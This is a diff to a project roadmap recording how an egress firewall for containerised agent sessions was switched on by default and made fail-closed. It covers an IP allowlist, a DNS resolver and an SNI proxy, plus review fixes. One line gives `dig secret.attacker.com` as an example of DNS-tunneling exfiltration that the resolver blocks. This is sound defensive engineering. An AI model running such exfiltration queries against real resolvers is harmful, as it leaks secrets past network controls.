@@ -71,8 +71,11 @@ tracker as separate issues. None implemented yet.
     - [x] Orchestrator wiring (`egress-firewall-install.ts` + test): cached+fallback
           `api.github.com/meta` fetch, `buildTierAEgressInputs`, `installEgressFirewall`
           (runs the sidecar in the agent netns with `NET_ADMIN`, fail-closed on non-zero).
-          Hooked into `createContainer` after start / before ready; gated on
-          `SESSION_EGRESS_ENFORCE=1` (default OFF) with `SESSION_EGRESS_SIDECAR_IMAGE`.
+          Hooked into `createContainer` after start / before ready; enforcement is
+          **ON by default** (opt out with `SESSION_EGRESS_ENFORCE=0`) and **fail-closed** —
+          a contained session refuses to start without `SESSION_EGRESS_SIDECAR_IMAGE`. The
+          compose files set the image; the installer (`deployment/*/setup.sh`) preflights the
+          NET_ADMIN sidecar and persists the opt-out for incapable hosts.
     - [x] **Verified on a live host (2026-06-15, dogfood container-mode orchestrator).**
           All three tiers enabled (`SESSION_EGRESS_ENFORCE/DNS/PROXY=1`), sidecar rebuilt,
           fresh session. Tier A floor holds: a raw socket to a non-allowlisted host on a
@@ -86,7 +89,8 @@ tracker as separate issues. None implemented yet.
   - **Tier B** — controlled DNS resolver (dnsmasq) in the agent netns: forwards only
     allowlisted domains (closes DNS tunneling — `dig secret.attacker.com` is refused) and
     pins resolved IPs into the Tier A ipset (kills stale-IP breakage). Own flag
-    `SESSION_EGRESS_DNS=1` (requires `SESSION_EGRESS_ENFORCE=1`), default OFF.
+    `SESSION_EGRESS_DNS` (requires Tier A enforcement), **default ON** (opt out with
+    `SESSION_EGRESS_DNS=0`).
     - [x] Config generation (`egress-dns.ts` + test): per-domain `server=`/`ipset=`, no
           default upstream, internal-names → Docker DNS, resolver `user=` for owner-match.
     - [x] Resolver runner + image (`run-resolver.sh`, `dnsmasq` + `egressdns` uid 911 in
@@ -135,8 +139,8 @@ tracker as separate issues. None implemented yet.
   - **Tier C** — transparent SNI proxy for hostname-level HTTPS policy (closes the CDN
     co-tenancy gap: an allowlisted host and a non-allowlisted host on one CDN IP are
     indistinguishable to the ipset, but their SNI differs). Own flag
-    `SESSION_EGRESS_PROXY=1` (requires Tier B + A), default OFF. **One PR, built in
-    stages (C1 enforcement, then C2 allow-once UX).**
+    `SESSION_EGRESS_PROXY` (requires Tier B + A), **default ON** (opt out with
+    `SESSION_EGRESS_PROXY=0`). **One PR, built in stages (C1 enforcement, then C2 allow-once UX).**
     - [x] **C1 — SNI-peek proxy + enforcement.** Tiny dependency-free Go binary
           (`docker/egress-sidecar/sni-proxy`, multi-stage build into the existing sidecar
           image) that peeks the ClientHello SNI (cleartext — NO decryption / CA injection,
@@ -275,8 +279,35 @@ tracker as separate issues. None implemented yet.
           `docker/local/dev/compose.yml` (→ `shipit-egress-sidecar:dev`) and
           `deployment/vps/docker-compose.yml` (→ `shipit-egress-sidecar:prod`), and wired it into
           both `docker/local/dev.sh` and `deployment/vps/deploy.sh` build commands, so every dev
-          boot / prod deploy rebuilds the sidecar in lockstep with `main`. Enforcement stays
-          default-OFF until an operator sets `SESSION_EGRESS_ENFORCE=1` + `SESSION_EGRESS_SIDECAR_IMAGE`.
+          boot / prod deploy rebuilds the sidecar in lockstep with `main`.
+    - [x] **Default-on flip (SHI-90, fail-closed for ALL instances).** Enforcement is now ON
+          by default: `egressEnforceEnabled()` returns true unless `SESSION_EGRESS_ENFORCE=0`
+          (Tiers B/C likewise default on, gated `!== "0"`, preserving C ⊃ B ⊃ A). All three
+          compose files set `SESSION_EGRESS_SIDECAR_IMAGE` (dev → `:dev`, vps/local-prod →
+          `:prod`) and build the sidecar; `container-lifecycle.ts` still fail-closed-throws
+          (reworded to name the escape hatch) when contained-but-no-image, and the container is
+          torn down on a runtime install throw. The installer (`deployment/local/setup.sh` +
+          `deployment/vps/setup.sh`) preflights the NET_ADMIN sidecar and persists
+          `SESSION_EGRESS_ENFORCE=0` (in the env file `deploy.sh` / `lib.sh` load) for incapable
+          hosts. `RUNTIME_MODE=local` stays inert (no `createContainer`).
+    - [x] **UI honesty — policy vs enforcement.** `EgressSettings`/`EgressSessionSettings`/
+          `EgressAllowlistView` carry `enforcementActive` (enforcement on AND image configured),
+          populated by `api-routes-egress.ts` from `egressEnforcementActive()` (threaded via
+          `ApiDeps.egressEnforcementActive`) and re-broadcast on `egress_settings`. Settings →
+          Network egress shows a "Contained — NOT enforced on this deployment" warning when
+          policy is Contained but `enforcementActive` is false. The per-session sidebar menu
+          (`SessionEgressMode`) shows the condensed equivalent when this session would resolve to
+          Contained (live off the selected mode) but enforcement is inactive. The fail-closed
+          session-start error reaches the user via the existing `recordCreateError` → health →
+          SessionHealthStrip channel (the reworded egress-specific message is what's shown).
+    - [x] **Cross-agent (Codex) review fixes.** (1) `deployment/vps/restart.sh` now sources
+          `/etc/shipit/shipit.env` like `deploy.sh`, so a persisted `SESSION_EGRESS_ENFORCE=0`
+          opt-out survives "Just Restart" instead of silently flipping enforcement back on.
+          (2) `docker/local/prod.sh` now builds `egress-sidecar` (its compose sets the image),
+          so the prod-like local runner doesn't fail closed on a missing sidecar.
+          (3) `container-lifecycle.ts` create-failure path now runs `cleanupSessionDockerResources`
+          (stop agent → reap parent-session children → remove agent, mirroring `destroyContainer`),
+          so a throw after the Tier B/C sidecars launched can't leak them. Regression test added.
 
 ## P1
 
